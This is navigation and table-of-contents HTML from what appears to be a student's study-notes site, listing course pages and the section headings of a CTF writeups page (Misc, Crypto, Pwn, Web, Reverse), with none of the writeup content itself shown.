                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            计算机组成与设计
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/co/review/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    复习
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/os/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    操作系统原理与实践
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6">
            <span class="md-nav__icon md-icon"></span>
            操作系统原理与实践
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/os/review/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    复习
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/oop/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    面向对象程序设计
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7">
            <span class="md-nav__icon md-icon"></span>
            面向对象程序设计
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/oop/review/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    复习
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_8" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/cv/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    计算机视觉导论
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_8">
            <span class="md-nav__icon md-icon"></span>
            计算机视觉导论
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/cv/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    线代知识回顾
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/cv/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    图像的形成
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/cv/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    图像的处理
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_9" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/quantum/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    量子计算理论基础与软件系统
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_9" id="__nav_2_9_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_9">
            <span class="md-nav__icon md-icon"></span>
            量子计算理论基础与软件系统
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/quantum/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    量子比特与量子门
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/quantum/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    量子测量与量子图灵机
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/quantum/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    量子算法
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_10" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/game/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    软件工程与游戏设计
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_10" id="__nav_2_10_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_10">
            <span class="md-nav__icon md-icon"></span>
            软件工程与游戏设计
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/game/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introductions
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/game/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sprites and Randomness
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/game/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Maze Algorithms
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/game/final/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Final Lab
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_11" >
        
          
          <label class="md-nav__link" for="__nav_2_11" id="__nav_2_11_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    机器学习
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_11">
            <span class="md-nav__icon md-icon"></span>
            机器学习
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ml/review/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    复习
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../math/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Math
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Math
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../math/prob_theory/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    概率论
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            概率论
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../math/prob_theory/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    事件及其概率
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../math/prob_theory/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    随机变量与分布函数
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../math/prob_theory/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    数字特征
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../math/prob_theory/chapter4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    概率极限定理
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../hpc/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    HPC
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            HPC
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../hpc/cute/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    cute
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            cute
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../hpc/cute/layout/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Layout
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../hpc/cute/tensor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tensor
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../hpc/hpc101/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    HPC 101
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_3">
            <span class="md-nav__icon md-icon"></span>
            HPC 101
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../hpc/hpc101/cuda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    课堂实验 NVIDIA CUDA C
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../others/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Others
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Others
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../others/sight_singing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    视唱练耳
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../others/piano/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    打开艺术之门——钢琴
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Labs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../labs/numpy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HPC lab2 向量化计算
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../labs/simd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HPC lab2.5 手写 SIMD 向量化
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../labs/cuda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HPC lab3 CUDA 使用基础
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../labs/pcg/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HPC lab4 PCG Solver
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../labs/cnn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HPC lab5 简单神经网络训练与加速
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../books/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Books
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Books
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../books/ostep/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    OSTEP
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_2">
            <span class="md-nav__icon md-icon"></span>
            OSTEP
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_2" >
        
          
          <label class="md-nav__link" for="__nav_7_2_2" id="__nav_7_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Virtualization
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_2_2">
            <span class="md-nav__icon md-icon"></span>
            Virtualization
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../books/ostep/chapter1/process/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CPU 虚拟化：进程
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
            
  
  <span class="md-ellipsis">
    CTF
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            CTF
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Writeups
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Writeups
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      Misc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#minecretf" class="md-nav__link">
    <span class="md-ellipsis">
      Minec(re)tf
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Minec(re)tf">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#start" class="md-nav__link">
    <span class="md-ellipsis">
      Start
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-4" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 4
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-5" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 5
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-6" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 6
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-8" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 8
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obtain-the-flag" class="md-nav__link">
    <span class="md-ellipsis">
      Obtain the Flag
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      锅里捞面
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#master-of-c" class="md-nav__link">
    <span class="md-ellipsis">
      Master of C++
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#a" class="md-nav__link">
    <span class="md-ellipsis">
      小 A 口算
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto" class="md-nav__link">
    <span class="md-ellipsis">
      Crypto
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Crypto">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fib-i" class="md-nav__link">
    <span class="md-ellipsis">
      FIB Ⅰ
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ezxor" class="md-nav__link">
    <span class="md-ellipsis">
      ezxor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shad0wtime" class="md-nav__link">
    <span class="md-ellipsis">
      Shad0wTime
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn" class="md-nav__link">
    <span class="md-ellipsis">
      Pwn
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pwn">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#easy-rop" class="md-nav__link">
    <span class="md-ellipsis">
      easy rop
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#easy-pentest" class="md-nav__link">
    <span class="md-ellipsis">
      easy Pentest
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reverse">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#rev-beginner-1" class="md-nav__link">
    <span class="md-ellipsis">
      rev beginner 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rev-beginner-2" class="md-nav__link">
    <span class="md-ellipsis">
      rev beginner 2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rev-beginner-3" class="md-nav__link">
    <span class="md-ellipsis">
      rev beginner 3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#easy-hap" class="md-nav__link">
    <span class="md-ellipsis">
      easy hap
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rukma" class="md-nav__link">
    <span class="md-ellipsis">
      Rukma
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      Misc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#minecretf" class="md-nav__link">
    <span class="md-ellipsis">
      Minec(re)tf
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Minec(re)tf">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#start" class="md-nav__link">
    <span class="md-ellipsis">
      Start
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-4" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 4
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-5" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 5
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-6" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 6
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#flag-piece-8" class="md-nav__link">
    <span class="md-ellipsis">
      Flag Piece 8
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obtain-the-flag" class="md-nav__link">
    <span class="md-ellipsis">
      Obtain the Flag
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      锅里捞面
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#master-of-c" class="md-nav__link">
    <span class="md-ellipsis">
      Master of C++
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#a" class="md-nav__link">
    <span class="md-ellipsis">
      小 A 口算
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto" class="md-nav__link">
    <span class="md-ellipsis">
      Crypto
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Crypto">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fib-i" class="md-nav__link">
    <span class="md-ellipsis">
      FIB Ⅰ
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ezxor" class="md-nav__link">
    <span class="md-ellipsis">
      ezxor
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shad0wtime" class="md-nav__link">
    <span class="md-ellipsis">
      Shad0wTime
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn" class="md-nav__link">
    <span class="md-ellipsis">
      Pwn
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Pwn">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#easy-rop" class="md-nav__link">
    <span class="md-ellipsis">
      easy rop
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#easy-pentest" class="md-nav__link">
    <span class="md-ellipsis">
      easy Pentest
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse
    </span>
